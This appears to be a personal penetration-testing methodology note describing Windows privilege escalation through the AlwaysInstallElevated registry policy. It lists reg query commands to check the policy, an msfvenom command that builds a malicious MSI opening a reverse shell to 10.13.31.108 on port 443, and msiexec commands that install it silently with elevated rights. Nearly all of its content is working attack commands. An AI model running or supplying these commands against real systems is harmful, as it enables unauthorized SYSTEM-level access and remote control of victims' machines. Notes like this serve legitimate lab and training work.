With always Install Elevated, we can create a malicos msi payload and trigger it for an elevated session as AlwaysInstallElevated allows you to run msi files in a high privileged user context.

Query the registry for AlwaysInstallElevated keys:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
I believe both needs to be set to 0x1 for it to work, but perhaps only 1 works too.

Next, we can create our malicous msi exeutable and run it with in a high privileged context:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.31.108 LPORT=443 -f msi -o reverse.msi

Now let's prep our listener and run the executable:
msiexec /quiet /qn /i \\TSCLIENT\share\reverse.msi
or 
msiexec /quiet /qn /i reverse.msi

![unnamed_342734b256c24ca1bcfade1da1fca610](docs/Attachments/_Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Windows%20Methodology/Attacks/Registry%20Attacks/Registry%20-%20AlwaysInstallElevated/{{notename}}-202605011742.png)
